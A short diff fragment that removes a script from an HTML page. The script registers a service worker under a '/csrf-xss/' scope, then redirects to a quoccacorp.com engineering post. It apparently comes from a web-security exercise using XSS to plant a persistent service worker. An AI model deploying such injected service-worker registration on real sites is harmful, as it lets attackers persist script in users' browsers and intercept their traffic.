@@ -29,12 +29,3 @@
   </body>
 </html>
  -->
-
- <script>
-  navigator.serviceWorker.register('/csrf-xss/service-worker.js', { scope: '/csrf-xss/' })
-    .then(() => {
-      alert('✅ Service Worker registered! Redirecting...');
-      location.href = 'https://engineering.quoccacorp.com/posts/5a1c5725-229d-4a3b-a840-a1233a12a7c0';
-    })
-    
-</script>
